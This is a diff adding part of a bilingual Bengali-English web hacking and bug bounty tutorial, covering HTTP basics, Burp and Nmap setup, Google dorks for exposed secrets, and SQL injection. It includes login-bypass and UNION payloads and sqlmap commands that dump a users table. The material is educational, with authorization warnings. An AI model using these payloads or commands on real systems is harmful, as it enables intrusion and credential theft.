+      <div class="box-t">⚠️ <span class="bn-text">এগুলো না মানলে Bounty পাবে না — আইনি সমস্যাও হতে পারে!</span><span class="en-text">Break these rules and you won't get paid — and may face legal trouble!</span></div>
+      <ul>
+        <li><span class="bn-text">শুধু <strong>in-scope</strong> টার্গেটে কাজ করো</span><span class="en-text">Only work on <strong>in-scope</strong> targets</span></li>
+        <li><span class="bn-text">User data নষ্ট বা চুরি করো না</span><span class="en-text">Don't destroy or steal user data</span></li>
+        <li><span class="bn-text">বাগ পেলে সাথে সাথে রিপোর্ট করো, exploit করো না</span><span class="en-text">Report bugs immediately, don't exploit them</span></li>
+        <li><span class="bn-text">Production system-এ automated scanner চালিও না</span><span class="en-text">Don't run automated scanners on production systems</span></li>
+        <li><span class="bn-text">Publicly disclose করার আগে কোম্পানিকে সময় দাও</span><span class="en-text">Give the company time before public disclosure</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🟢 <span class="bn-text">White Hat = Ethical Hacker = আইনি, অনুমতিসহ</span><span class="en-text">White Hat = Ethical Hacker = legal, with permission</span></li>
+        <li>💰 <span class="bn-text">Bug Bounty = কোম্পানির বাগ খুঁজে পুরস্কার পাওয়া</span><span class="en-text">Bug Bounty = finding company bugs and getting rewarded</span></li>
+        <li>⚖️ <span class="bn-text">সবসময় authorized target-এ কাজ করো</span><span class="en-text">Always work on authorized targets only</span></li>
+        <li>🏆 HackerOne, Bugcrowd, Intigriti — <span class="bn-text">শুরু করার জায়গা</span><span class="en-text">places to start</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 2: HTTP & How the Web Works
+══════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title">🌐 <span class="bn-text">HTTP ও ওয়েব কিভাবে কাজ করে</span><span class="en-text">HTTP & How the Web Works</span></div>
+    <div class="chapter-desc"><span class="bn-text">Request, Response, Headers, Status Codes, Cookies — Hacker-এর দৃষ্টিতে</span><span class="en-text">Request, Response, Headers, Status Codes, Cookies — from a hacker's perspective</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🔄 <span class="bn-text">ব্রাউজার থেকে সার্ভার — কী হয়?</span><span class="en-text">Browser to Server — What Happens?</span></h2>
+    <div class="diagram">
+<pre><span class="db">তুমি browser-এ টাইপ করো: https://example.com/login</span>
+
+<span class="dg">Browser (Client)          ←→           Server</span>
+
+Step 1: DNS Lookup
+  <span class="db">example.com</span> → <span class="dy">93.184.216.34</span> (IP address)
+
+Step 2: TCP Connection (3-way handshake)
+  Client → SYN → Server
+  Client ← SYN-ACK ← Server
+  Client → ACK → Server
+
+Step 3: TLS Handshake (HTTPS)
+  <span class="dp">SSL Certificate exchange, encryption setup</span>
+
+Step 4: HTTP Request পাঠানো
+  <span class="dg">GET /login HTTP/1.1</span>
+
+Step 5: HTTP Response পাওয়া
+  <span class="dy">200 OK + HTML page</span>
+
+Step 6: Browser HTML render করে</pre>
+    </div>
+
+    <h2 class="sec">📤 HTTP Request — <span class="bn-text">ব্রাউজার কী পাঠায়</span><span class="en-text">What the Browser Sends</span></h2>
+    <div class="http-box">
+      <div style="color:#6a8aa8; font-size:11px; letter-spacing:2px; margin-bottom:10px;">HTTP REQUEST</div>
+      <div><span class="http-method">POST</span> <span class="http-path">/login</span> <span class="http-ver">HTTP/1.1</span></div>
+      <div style="margin-top:8px;">
+        <span class="http-header">Host:</span> <span class="http-value">example.com</span><br>
+        <span class="http-header">Content-Type:</span> <span class="http-value">application/x-www-form-urlencoded</span><br>
+        <span class="http-header">Cookie:</span> <span class="http-value">session=abc123xyz</span><br>
+        <span class="http-header">User-Agent:</span> <span class="http-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br>
+        <span class="http-header">Content-Length:</span> <span class="http-value">38</span>
+      </div>
+      <div style="margin-top:12px; border-top: 1px solid #1a3a5c; padding-top:10px;">
+        <span class="http-body">username=admin&amp;password=pass1234</span>
+      </div>
+    </div>
+
+    <h2 class="sec">📥 HTTP Response — <span class="bn-text">সার্ভার কী পাঠায়</span><span class="en-text">What the Server Sends Back</span></h2>
+    <div class="http-box">
+      <div style="color:#6a8aa8; font-size:11px; letter-spacing:2px; margin-bottom:10px;">HTTP RESPONSE</div>
+      <div><span class="http-ver">HTTP/1.1</span> <span class="http-status-ok">200 OK</span></div>
+      <div style="margin-top:8px;">
+        <span class="http-header">Content-Type:</span> <span class="http-value">text/html; charset=UTF-8</span><br>
+        <span class="http-header">Set-Cookie:</span> <span class="http-value">session=newtoken456; HttpOnly; Secure</span><br>
+        <span class="http-header">X-Frame-Options:</span> <span class="http-value">DENY</span><br>
+        <span class="http-header">Server:</span> <span class="http-value">nginx/1.18.0</span>
+      </div>
+      <div style="margin-top:12px; border-top: 1px solid #1a3a5c; padding-top:10px;">
+        <span class="http-body">&lt;html&gt; &lt;body&gt; স্বাগতম, admin! &lt;/body&gt; &lt;/html&gt;</span>
+      </div>
+    </div>
+
+    <h2 class="sec">📊 HTTP Status Codes — <span class="bn-text">সার্ভারের জবাব</span><span class="en-text">Server's Reply</span></h2>
+    <table>
+      <thead><tr><th>Code</th><th><span class="bn-text">অর্থ</span><span class="en-text">Meaning</span></th><th>Hacker <span class="bn-text">দৃষ্টিতে</span><span class="en-text">perspective</span></th></tr></thead>
+      <tbody>
+        <tr><td><code>200 OK</code></td><td><span class="bn-text">সফল</span><span class="en-text">Success</span></td><td><span class="bn-text">পেলাম! তথ্য বিশ্লেষণ করো</span><span class="en-text">Got it! Analyze the data</span></td></tr>
+        <tr><td><code>301/302</code></td><td><span class="bn-text">Redirect</span><span class="en-text">Redirect</span></td><td><span class="bn-text">নতুন URL-এ যাও</span><span class="en-text">Go to new URL</span></td></tr>
+        <tr><td><code>400</code></td><td><span class="bn-text">Bad Request</span><span class="en-text">Bad Request</span></td><td><span class="bn-text">ভুল input — payload ঠিক করো</span><span class="en-text">Wrong input — fix your payload</span></td></tr>
+        <tr><td><code>401</code></td><td><span class="bn-text">Unauthorized</span><span class="en-text">Unauthorized</span></td><td><span class="bn-text">Login দরকার</span><span class="en-text">Need to log in</span></td></tr>
+        <tr><td><code>403</code></td><td><span class="bn-text">Forbidden</span><span class="en-text">Forbidden</span></td><td><span class="bn-text">Access নেই — bypass চেষ্টা করো</span><span class="en-text">No access — try to bypass</span></td></tr>
+        <tr><td><code>404</code></td><td><span class="bn-text">Not Found</span><span class="en-text">Not Found</span></td><td><span class="bn-text">পেলাম না — অন্য path চেষ্টা করো</span><span class="en-text">Not found — try other paths</span></td></tr>
+        <tr><td><code>500</code></td><td><span class="bn-text">Server Error</span><span class="en-text">Server Error</span></td><td><span class="bn-text">🔥 সার্ভার crash — vulnerability আছে!</span><span class="en-text">🔥 Server crash — vulnerability found!</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🍪 Cookies ও Sessions — <span class="bn-text">পরিচয় মনে রাখা</span><span class="en-text">Remembering Identity</span></h2>
+    <p><span class="bn-text">HTTP stateless — প্রতিটা request আলাদা। তাই Cookie/Session দিয়ে login state মনে রাখা হয়।</span><span class="en-text">HTTP is stateless — every request is separate. So Cookies/Sessions remember login state.</span></p>
+    <div class="grid2">
+      <div class="card">
+        <h4>🍪 Cookie</h4>
+        <ul>
+          <li><span class="bn-text">Browser-এ সংরক্ষিত</span><span class="en-text">Stored in browser</span></li>
+          <li><span class="bn-text">প্রতি request-এ পাঠানো হয়</span><span class="en-text">Sent with every request</span></li>
+          <li><span class="bn-text">Hacker চুরি করলে account দখল!</span><span class="en-text">If hacker steals it → account takeover!</span></li>
+          <li><code>HttpOnly</code> — <span class="bn-text">JS পড়তে পারবে না</span><span class="en-text">JS can't read</span></li>
+          <li><code>Secure</code> — <span class="bn-text">শুধু HTTPS-এ</span><span class="en-text">HTTPS only</span></li>
+        </ul>
+      </div>
+      <div class="card orange-card">
+        <h4>⚠️ <span class="bn-text">Hacker কী দেখে?</span><span class="en-text">What Does a Hacker Look For?</span></h4>
+        <ul>
+          <li><span class="bn-text">Cookie-তে predictable value?</span><span class="en-text">Predictable value in cookie?</span></li>
+          <li><span class="bn-text">HttpOnly flag নেই? → XSS দিয়ে চুরি!</span><span class="en-text">No HttpOnly flag? → Steal with XSS!</span></li>
+          <li><span class="bn-text">Secure flag নেই? → HTTP-তে দেখা যাবে</span><span class="en-text">No Secure flag? → Visible over HTTP</span></li>
+          <li><span class="bn-text">Session fixation possible?</span><span class="en-text">Session fixation possible?</span></li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec">🔍 <span class="bn-text">Security Headers — কী থাকা উচিত</span><span class="en-text">Security Headers — What Should Exist</span></h2>
+    <table>
+      <thead><tr><th>Header</th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th><th><span class="bn-text">না থাকলে</span><span class="en-text">If Missing</span></th></tr></thead>
+      <tbody>
+        <tr><td><code>X-Frame-Options</code></td><td><span class="bn-text">Iframe থেকে রক্ষা</span><span class="en-text">Protection from iframe</span></td><td><span class="badge badge-o">Clickjacking</span></td></tr>
+        <tr><td><code>Content-Security-Policy</code></td><td><span class="bn-text">Script execution নিয়ন্ত্রণ</span><span class="en-text">Control script execution</span></td><td><span class="badge badge-r">XSS সহজ</span></td></tr>
+        <tr><td><code>Strict-Transport-Security</code></td><td><span class="bn-text">শুধু HTTPS</span><span class="en-text">HTTPS only</span></td><td><span class="badge badge-o">MitM Attack</span></td></tr>
+        <tr><td><code>X-Content-Type-Options</code></td><td><span class="bn-text">MIME sniffing বন্ধ</span><span class="en-text">Disable MIME sniffing</span></td><td><span class="badge badge-y">MIME attack</span></td></tr>
+      </tbody>
+    </table>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔄 <span class="bn-text">Browser → DNS → TCP → HTTP Request → Response</span></li>
+        <li>📤 <span class="bn-text">Request-এ: Method, Path, Headers, Body</span><span class="en-text">In Request: Method, Path, Headers, Body</span></li>
+        <li>📊 <span class="bn-text">500 error মানে server crash → vulnerability!</span><span class="en-text">500 error means server crash → vulnerability!</span></li>
+        <li>🍪 <span class="bn-text">Cookie চুরি = Account Takeover</span><span class="en-text">Cookie theft = Account Takeover</span></li>
+        <li>🔒 <span class="bn-text">Security Headers না থাকলে vulnerability</span><span class="en-text">Missing Security Headers = vulnerability</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 3: Tools Setup
+══════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title">🛠️ <span class="bn-text">Tools Setup</span><span class="en-text">Tools Setup</span></div>
+    <div class="chapter-desc"><span class="bn-text">Burp Suite, Kali Linux, Nmap, ffuf — Hacker-এর অস্ত্রভাণ্ডার সাজানো</span><span class="en-text">Burp Suite, Kali Linux, Nmap, ffuf — setting up the hacker's arsenal</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🎯 <span class="bn-text">কোন Tool কখন ব্যবহার করবো?</span><span class="en-text">Which Tool for What?</span></h2>
+    <table>
+      <thead><tr><th>Tool</th><th><span class="bn-text">কাজ</span><span class="en-text">Purpose</span></th><th><span class="bn-text">কখন</span><span class="en-text">When</span></th></tr></thead>
+      <tbody>
+        <tr><td><strong>Burp Suite</strong></td><td><span class="bn-text">HTTP traffic intercept, manipulate</span></td><td><span class="bn-text">সবসময় — সবচেয়ে গুরুত্বপূর্ণ</span><span class="en-text">Always — most important</span></td></tr>
+        <tr><td><strong>Nmap</strong></td><td><span class="bn-text">Port scan, service detect</span></td><td><span class="bn-text">Recon phase-এ</span><span class="en-text">In recon phase</span></td></tr>
+        <tr><td><strong>ffuf / gobuster</strong></td><td><span class="bn-text">Directory/file bruteforce</span></td><td><span class="bn-text">Hidden path খুঁজতে</span><span class="en-text">Finding hidden paths</span></td></tr>
+        <tr><td><strong>sqlmap</strong></td><td><span class="bn-text">SQL injection automation</span></td><td><span class="bn-text">SQLi confirm করতে</span><span class="en-text">Confirming SQLi</span></td></tr>
+        <tr><td><strong>nikto</strong></td><td><span class="bn-text">Web server scan</span></td><td><span class="bn-text">Quick vulnerability check</span></td></tr>
+        <tr><td><strong>subfinder / amass</strong></td><td><span class="bn-text">Subdomain enumeration</span></td><td><span class="bn-text">Scope বাড়াতে</span><span class="en-text">Expanding scope</span></td></tr>
+        <tr><td><strong>Wappalyzer</strong></td><td><span class="bn-text">Technology detection</span></td><td><span class="bn-text">Stack জানতে</span><span class="en-text">Knowing the stack</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">🦆 Burp Suite Setup</h2>
+    <p><span class="bn-text">Burp Suite হলো Web Hacking-এর সবচেয়ে গুরুত্বপূর্ণ tool। এটা Browser ও Server-এর মাঝখানে বসে traffic দেখে এবং modify করে।</span><span class="en-text">Burp Suite is the most important tool in web hacking. It sits between the browser and server, viewing and modifying traffic.</span></p>
+
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-body"><strong>Download:</strong> portswigger.net/burp — Community Edition <span class="bn-text">ফ্রি</span><span class="en-text">is free</span></div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-body"><strong>Browser Proxy:</strong> <span class="bn-text">Browser-এ FoxyProxy বা Proxy extension ইনস্টল করো। Burp-এর proxy 127.0.0.1:8080 সেট করো।</span><span class="en-text">Install FoxyProxy or Proxy extension in browser. Set Burp's proxy to 127.0.0.1:8080.</span></div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-body"><strong>SSL Certificate:</strong> <span class="bn-text">http://burpsuite তে গিয়ে Burp-এর CA certificate ডাউনলোড ও install করো।</span><span class="en-text">Go to http://burpsuite, download and install Burp's CA certificate.</span></div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-body"><strong>Intercept:</strong> <span class="bn-text">Proxy → Intercept → On করো। এখন browser-এর request Burp-এ আটকাবে।</span><span class="en-text">Proxy → Intercept → Turn On. Now browser requests will be intercepted in Burp.</span></div>
+    </div>
+
+    <div class="diagram">
+<pre><span class="db">Browser</span> ←→ <span class="dg">Burp Suite Proxy (127.0.0.1:8080)</span> ←→ <span class="dy">Server</span>
+
+Burp Suite-এর গুরুত্বপূর্ণ Modules:
+<span class="dg">Proxy</span>     → Request intercept করো ও modify করো
+<span class="dy">Repeater</span>  → একই request বারবার পাঠাও (manually)
+<span class="dp">Intruder</span>  → Automated attack (brute force, fuzzing)
+<span class="db">Scanner</span>   → Automatic vulnerability scan (Pro only)
+<span class="do">Decoder</span>   → Base64, URL encode/decode
+<span class="dr">Comparer</span>  → দুটো response তুলনা করো</pre>
+    </div>
+
+    <h2 class="sec">🗺️ Nmap — <span class="bn-text">Port ও Service খোঁজা</span><span class="en-text">Finding Ports & Services</span></h2>
+    <div class="code"><span class="c"># Basic scan</span>
+<span class="p">$</span> nmap <span class="b">target.com</span>
+
+<span class="c"># Service version detect</span>
+<span class="p">$</span> nmap -sV <span class="b">target.com</span>
+
+<span class="c"># All ports scan</span>
+<span class="p">$</span> nmap -p- <span class="b">target.com</span>
+
+<span class="c"># OS detect + script scan</span>
+<span class="p">$</span> nmap -A <span class="b">target.com</span>
+
+<span class="c"># Stealth scan</span>
+<span class="p">$</span> nmap -sS <span class="b">target.com</span></div>
+    <div class="output"><div class="output-label">⬇ EXAMPLE OUTPUT</div>PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 8.2
+80/tcp  open  http    nginx 1.18.0
+443/tcp open  https   nginx 1.18.0
+3306/tcp open  mysql  MySQL 5.7.36</div>
+
+    <h2 class="sec">📁 ffuf — <span class="bn-text">লুকানো Directory খোঁজা</span><span class="en-text">Finding Hidden Directories</span></h2>
+    <div class="code"><span class="c"># Directory bruteforce</span>
+<span class="p">$</span> ffuf -w /usr/share/wordlists/dirb/common.txt \
+       -u <span class="s">https://target.com/FUZZ</span>
+
+<span class="c"># Extension সহ</span>
+<span class="p">$</span> ffuf -w wordlist.txt -u <span class="s">https://target.com/FUZZ</span> \
+       -e .php,.html,.txt,.bak
+
+<span class="c"># Subdomain brute force</span>
+<span class="p">$</span> ffuf -w subdomains.txt \
+       -u <span class="s">https://FUZZ.target.com</span> \
+       -H <span class="s">"Host: FUZZ.target.com"</span></div>
+    <div class="output"><div class="output-label">⬇ EXAMPLE OUTPUT</div>admin               [Status: 200, Size: 4521]
+backup.php          [Status: 200, Size: 892]
+.git                [Status: 403, Size: 150]
+config.bak          [Status: 200, Size: 234]</div>
+
+    <div class="box success">
+      <div class="box-t">💡 <span class="bn-text">Wordlist কোথায় পাবো?</span><span class="en-text">Where to Find Wordlists?</span></div>
+      <ul>
+        <li><strong>SecLists</strong> — github.com/danielmiessler/SecLists (<span class="bn-text">সবচেয়ে ভালো</span><span class="en-text">the best</span>)</li>
+        <li><strong>Kali-তে built-in:</strong> /usr/share/wordlists/</li>
+        <li><strong>rockyou.txt</strong> — <span class="bn-text">password cracking-এর জন্য</span><span class="en-text">for password cracking</span></li>
+      </ul>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🦆 <span class="bn-text">Burp Suite = Web Hacking-এর সবচেয়ে গুরুত্বপূর্ণ tool</span><span class="en-text">Burp Suite = most important web hacking tool</span></li>
+        <li>🗺️ <span class="bn-text">Nmap = কোন port খোলা, কোন service চলছে</span><span class="en-text">Nmap = which ports are open, which services are running</span></li>
+        <li>📁 <span class="bn-text">ffuf = লুকানো directory ও file খোঁজা</span><span class="en-text">ffuf = finding hidden directories and files</span></li>
+        <li>📚 <span class="bn-text">SecLists = সেরা wordlist collection</span><span class="en-text">SecLists = best wordlist collection</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 4: Reconnaissance
+══════════════════════════════════ -->
+<div class="chapter ch4">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title">🔭 <span class="bn-text">Reconnaissance — তথ্য সংগ্রহ</span><span class="en-text">Reconnaissance — Information Gathering</span></div>
+    <div class="chapter-desc"><span class="bn-text">Attack শুরুর আগে যতটা সম্ভব তথ্য জমানো — Passive ও Active Recon</span><span class="en-text">Gathering as much information as possible before attacking — Passive & Active Recon</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">📡 <span class="bn-text">Passive Recon — কোনো ছোঁয়া না দিয়ে</span><span class="en-text">Passive Recon — Without Touching the Target</span></h2>
+    <p><span class="bn-text">Passive Recon-এ সরাসরি target-এ কোনো request পাঠাই না। Public source থেকে তথ্য সংগ্রহ করি।</span><span class="en-text">In Passive Recon we don't send any requests to the target. We collect information from public sources.</span></p>
+
+    <h3 class="sub">🔍 Google Dorking</h3>
+    <p><span class="bn-text">Google-এর advanced search operator ব্যবহার করে sensitive তথ্য খোঁজা।</span><span class="en-text">Using Google's advanced search operators to find sensitive information.</span></p>
+    <table>
+      <thead><tr><th>Dork</th><th><span class="bn-text">কী খোঁজে</span><span class="en-text">What it finds</span></th><th><span class="bn-text">উদাহরণ</span><span class="en-text">Example</span></th></tr></thead>
+      <tbody>
+        <tr><td><code>site:</code></td><td><span class="bn-text">নির্দিষ্ট সাইটে খোঁজ</span><span class="en-text">Search within site</span></td><td><code>site:target.com</code></td></tr>
+        <tr><td><code>filetype:</code></td><td><span class="bn-text">ফাইল ধরন</span><span class="en-text">File type</span></td><td><code>site:target.com filetype:pdf</code></td></tr>
+        <tr><td><code>inurl:</code></td><td><span class="bn-text">URL-এ কিছু আছে</span><span class="en-text">URL contains</span></td><td><code>inurl:admin site:target.com</code></td></tr>
+        <tr><td><code>intitle:</code></td><td><span class="bn-text">Title-এ কিছু আছে</span><span class="en-text">Title contains</span></td><td><code>intitle:"index of" site:target.com</code></td></tr>
+        <tr><td><code>intext:</code></td><td><span class="bn-text">Page-এ কিছু আছে</span><span class="en-text">Page contains</span></td><td><code>intext:"sql syntax" site:target.com</code></td></tr>
+        <tr><td><code>cache:</code></td><td><span class="bn-text">Google-এর cached version</span><span class="en-text">Google's cached version</span></td><td><code>cache:target.com</code></td></tr>
+      </tbody>
+    </table>
+
+    <div class="code"><span class="c"># Sensitive file খোঁজার দরকারি dork / Useful dorks for sensitive files</span>
+<span class="s">site:target.com filetype:sql</span>               <span class="c"># SQL dump</span>
+<span class="s">site:target.com filetype:env</span>               <span class="c"># .env file (API keys!)</span>
+<span class="s">site:target.com "index of /"</span>               <span class="c"># Directory listing</span>
+<span class="s">site:target.com inurl:"/admin"</span>             <span class="c"># Admin panel</span>
+<span class="s">site:target.com inurl:"phpinfo.php"</span>        <span class="c"># PHP info</span>
+<span class="s">site:target.com "password" filetype:txt</span>    <span class="c"># Password files</span></div>
+
+    <h3 class="sub">🌐 Subdomain Enumeration</h3>
+    <div class="code"><span class="c"># subfinder দিয়ে</span>
+<span class="p">$</span> subfinder -d target.com -o subdomains.txt
+
+<span class="c"># amass দিয়ে</span>
+<span class="p">$</span> amass enum -d target.com
+
+<span class="c"># crt.sh থেকে (certificate transparency)</span>
+<span class="p">$</span> curl <span class="url">https://crt.sh/?q=%.target.com&output=json</span> | jq
+
+<span class="c"># DNS bruteforce</span>
+<span class="p">$</span> ffuf -w subdomains-wordlist.txt \
+       -u <span class="s">https://FUZZ.target.com</span></div>
+
+    <h3 class="sub">🔎 <span class="bn-text">WHOIS ও DNS Information</span><span class="en-text">WHOIS & DNS Information</span></h3>
+    <div class="code"><span class="c"># WHOIS — কার সাইট, কখন নিবন্ধন</span>
+<span class="p">$</span> whois target.com
+
+<span class="c"># DNS records</span>
+<span class="p">$</span> dig target.com ANY
+<span class="p">$</span> nslookup target.com
+<span class="p">$</span> host target.com
+
+<span class="c"># দরকারি DNS record types</span>
+<span class="c"># A    → IP address</span>
+<span class="c"># MX   → Mail server</span>
+<span class="c"># TXT  → SPF, DKIM, verification</span>
+<span class="c"># CNAME → Alias (subdomain takeover!)  </span></div>
+
+    <h2 class="sec">🎯 <span class="bn-text">Active Recon — সরাসরি পরীক্ষা</span><span class="en-text">Active Recon — Direct Testing</span></h2>
+    <div class="box warn"><div class="box-t">⚠️</div><span class="bn-text">Active Recon সরাসরি target-এ request পাঠায়। শুধু authorized target-এ করো।</span><span class="en-text">Active Recon sends requests directly to the target. Only do this on authorized targets.</span></div>
+
+    <div class="code"><span class="c"># Web technology detect করা</span>
+<span class="p">$</span> whatweb target.com
+<span class="p">$</span> wappalyzer  <span class="c"># browser extension</span>
+
+<span class="c"># HTTP headers দেখা</span>
+<span class="p">$</span> curl -I https://target.com
+
+<span class="c"># robots.txt দেখা — লুকানো path থাকতে পারে!</span>
+<span class="p">$</span> curl https://target.com/robots.txt
+
+<span class="c"># sitemap দেখা</span>
+<span class="p">$</span> curl https://target.com/sitemap.xml</div>
+    <div class="output"><div class="output-label">⬇ robots.txt EXAMPLE — এটা দেখলে attack surface বাড়ে!</div>User-agent: *
+Disallow: /admin/
+Disallow: /backup/
+Disallow: /api/internal/
+Disallow: /config/</div>
+
+    <div class="box success">
+      <div class="box-t">💡 Pro Tip: <span class="bn-text">Wayback Machine</span></div>
+      <span class="bn-text"><strong>web.archive.org</strong> থেকে পুরনো version-এ হয়তো sensitive information আছে, বা এখন remove করা হয়েছে এমন endpoint পাবে।</span>
+      <span class="en-text"><strong>web.archive.org</strong> old versions may have sensitive information or removed endpoints that still exist on the server.</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>🔍 <span class="bn-text">Google Dork = Public source থেকে sensitive info</span><span class="en-text">Google Dork = sensitive info from public sources</span></li>
+        <li>🌐 <span class="bn-text">Subdomain enum = বেশি attack surface</span><span class="en-text">Subdomain enum = more attack surface</span></li>
+        <li>📄 <span class="bn-text">robots.txt = হয়তো লুকানো path-এর list!</span><span class="en-text">robots.txt = possibly a list of hidden paths!</span></li>
+        <li>⏪ <span class="bn-text">Wayback Machine = পুরনো sensitive content</span><span class="en-text">Wayback Machine = old sensitive content</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<!-- ══════════════════════════════════
+     CH 5: SQL Injection
+══════════════════════════════════ -->
+<div class="chapter ch5">
+  <div class="chapter-header">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title">💉 SQL Injection (SQLi)</div>
+    <div class="chapter-desc"><span class="bn-text">Database-কে ধোঁকা দিয়ে unauthorized data বের করা — OWASP Top 1</span><span class="en-text">Tricking the database into revealing unauthorized data — OWASP Top 1</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🤔 SQL Injection কী?</h2>
+    <p><span class="bn-text">ওয়েব অ্যাপ্লিকেশন যখন user-এর input সরাসরি SQL query-তে ঢুকিয়ে দেয়, তখন attacker ইচ্ছামতো SQL command inject করতে পারে।</span><span class="en-text">When a web application directly inserts user input into an SQL query, an attacker can inject arbitrary SQL commands.</span></p>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <h4>🔴 Vulnerable Code</h4>
+        <span class="sev sev-critical">CRITICAL</span>
+      </div>
+      <div class="vuln-body">
+        <div class="code" style="margin:0;">
+<span class="c"># ভুল — user input সরাসরি query-তে</span>
+username = <span class="b">request</span>.get(<span class="s">"username"</span>)
+query = <span class="s">"SELECT * FROM users WHERE username = '"</span> + username + <span class="s">"'"</span>
+<span class="c"># username = admin'-- দিলে কী হয়?</span>
+<span class="c"># Query হয়: SELECT * FROM users WHERE username = 'admin'--'</span>
+<span class="c"># -- মানে comment → password check skip!</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🧪 <span class="bn-text">SQLi Test করার উপায়</span><span class="en-text">How to Test for SQLi</span></h2>
+    <div class="code"><span class="c"># Step 1: Single quote দিয়ে test করো</span>
+https://target.com/item?id=<span class="r">1'</span>
+<span class="c"># Error আসলে → SQLi হতে পারে!</span>
+<span class="c"># "You have an error in your SQL syntax" → confirmed!</span>
+
+<span class="c"># Step 2: Boolean based test</span>
+https://target.com/item?id=<span class="r">1 AND 1=1</span>  <span class="c"># Normal response</span>
+https://target.com/item?id=<span class="r">1 AND 1=2</span>  <span class="c"># Different response → SQLi!</span>
+
+<span class="c"># Step 3: Time based (blind)</span>
+https://target.com/item?id=<span class="r">1; SLEEP(5)--</span>
+<span class="c"># 5 সেকেন্ড দেরি হলে → SQLi confirmed!</span></div>
+
+    <h2 class="sec">💣 <span class="bn-text">Common SQLi Payloads</span><span class="en-text">Common SQLi Payloads</span></h2>
+    <div class="code"><span class="c">-- Login Bypass --</span>
+<span class="r">admin'--</span>
+<span class="r">admin' #</span>
+<span class="r">' OR '1'='1</span>
+<span class="r">admin'/*</span>
+<span class="r">' OR 1=1--</span>
+<span class="r">" OR ""="</span>
+
+<span class="c">-- UNION based (data extraction) --</span>
+<span class="r">1' ORDER BY 3--</span>        <span class="c"># column count বের করা</span>
+<span class="r">1' UNION SELECT NULL,NULL,NULL--</span>
+<span class="r">1' UNION SELECT username,password,3 FROM users--</span>
+
+<span class="c">-- Database information --</span>
+<span class="r">1' UNION SELECT @@version,NULL,NULL--</span>    <span class="c"># DB version</span>
+<span class="r">1' UNION SELECT database(),NULL,NULL--</span>   <span class="c"># DB name</span>
+<span class="r">1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--</span></div>
+
+    <h2 class="sec">🤖 SQLMap — <span class="bn-text">Automation</span><span class="en-text">Automation</span></h2>
+    <div class="code"><span class="c"># Basic SQLMap</span>
+<span class="p">$</span> sqlmap -u <span class="s">"https://target.com/item?id=1"</span>
+
+<span class="c"># সব database দেখো</span>
+<span class="p">$</span> sqlmap -u <span class="s">"https://target.com/item?id=1"</span> --dbs
+
+<span class="c"># নির্দিষ্ট database-এর tables</span>
+<span class="p">$</span> sqlmap -u <span class="s">"https://target.com/item?id=1"</span> -D targetdb --tables
+
+<span class="c"># নির্দিষ্ট table-এর data</span>
+<span class="p">$</span> sqlmap -u <span class="s">"https://target.com/item?id=1"</span> -D targetdb -T users --dump
+
+<span class="c"># POST request-এ SQLi</span>
+<span class="p">$</span> sqlmap -u <span class="s">"https://target.com/login"</span> \
+         --data <span class="s">"username=admin&password=test"</span> \
+         -p username</div>
+
+    <div class="box warn">
+      <div class="box-t">⚠️ <span class="bn-text">শুধু authorized target-এ SQLMap চালাও</span><span class="en-text">Only run SQLMap on authorized targets</span></div>
+      <span class="bn-text">SQLMap automated tool — production server-এ চালালে crash করতে পারে এবং আইনি সমস্যা হতে পারে।</span>
+      <span class="en-text">SQLMap is automated — running on production may crash it and cause legal problems.</span>
+    </div>
+
+    <div class="chapter-summary">
+      <h3>📌 <span class="bn-text">Chapter সারসংক্ষেপ</span><span class="en-text">Chapter Summary</span></h3>
+      <ul>
+        <li>💉 <span class="bn-text">SQLi = user input SQL query-তে inject হলে</span><span class="en-text">SQLi = when user input gets injected into SQL query</span></li>
+        <li>🧪 <span class="bn-text">Test: single quote <code>'</code> দিয়ে শুরু করো</span><span class="en-text">Test: start with single quote <code>'</code></span></li>
+        <li>🔑 <span class="bn-text">Login bypass: <code>' OR '1'='1</code></span></li>
+        <li>🤖 <span class="bn-text">SQLMap = automated SQLi testing</span></li>
